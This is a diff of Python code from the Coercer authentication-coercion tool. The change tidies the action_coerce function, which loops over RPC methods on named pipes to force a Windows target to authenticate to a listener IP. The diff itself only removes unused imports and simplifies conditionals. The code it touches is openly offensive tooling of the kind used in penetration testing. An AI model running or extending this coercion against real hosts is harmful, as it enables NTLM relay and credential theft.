@@ -5,29 +5,26 @@
 # Date created       : 18 Sep 2022
 
 
-import sys
 import time
 from coercer.core.MethodFilter import MethodFilter
-from coercer.core.utils import generate_exploit_templates, generate_exploit_path_from_template
+from coercer.core.utils import generate_exploit_path_from_template
 from coercer.network.DCERPCSession import DCERPCSession
 from coercer.structures.TestResult import TestResult
 from coercer.network.authentications import trigger_authentication
-from coercer.network.smb import can_connect_to_pipe, can_bind_to_interface, list_remote_pipes
-from coercer.network.utils import get_ip_addr_to_listen_on
+from coercer.network.smb import can_connect_to_pipe, can_bind_to_interface
 
 
 def action_coerce(target, available_methods, options, credentials, reporter):
-
     reporter.verbose = True
-    http_listen_port = 80
 
     method_filter = MethodFilter(
         filter_method_name=options.filter_method_name,
         filter_protocol_name=options.filter_protocol_name
     )
 
+    # Preparing tasks ==============================================================================================================
+
     tasks = {}
-    # Prepare tasks
     for method_type in available_methods.keys():
         for category in sorted(available_methods[method_type].keys()):
             for method in sorted(available_methods[method_type][category].keys()):
@@ -58,6 +55,7 @@ def action_coerce(target, available_methods, options, credentials, reporter):
 
     if options.verbose:
         print("[+] Coercing '%s' to authenticate to '%s'" % (target, options.listener_ip))
+
     # Processing ncan_np tasks
     ncan_np_tasks = tasks["ncan_np"]
     for namedpipe in sorted(ncan_np_tasks.keys()):
@@ -73,7 +71,7 @@ def action_coerce(target, available_methods, options, credentials, reporter):
 
                             stop_exploiting_this_function = False
                             for listener_type, exploitpath in exploit_paths:
-                                if stop_exploiting_this_function == True:
+                                if stop_exploiting_this_function:
                                     # Got a nca_s_unk_if response, this function does not listen on the given interface
                                     continue
 
@@ -113,7 +111,7 @@ def action_coerce(target, available_methods, options, credentials, reporter):
                                     # Sleep between attempts
                                     time.sleep(options.delay)
 
-                                if options.always_continue == False:
+                                if not options.always_continue:
                                     next_action_answer = None
                                     while next_action_answer not in ["C","S","X"]:
                                         next_action_answer = input("Continue (C) | Skip this function (S) | Stop exploitation (X) ? ")
@@ -124,7 +122,6 @@ def action_coerce(target, available_methods, options, credentials, reporter):
                                     elif next_action_answer == "S":
                                         stop_exploiting_this_function = True
                                     elif next_action_answer == "X":
-                                        print("[+] Bye bye!")
                                         return None
                     else:
                         if options.verbose:
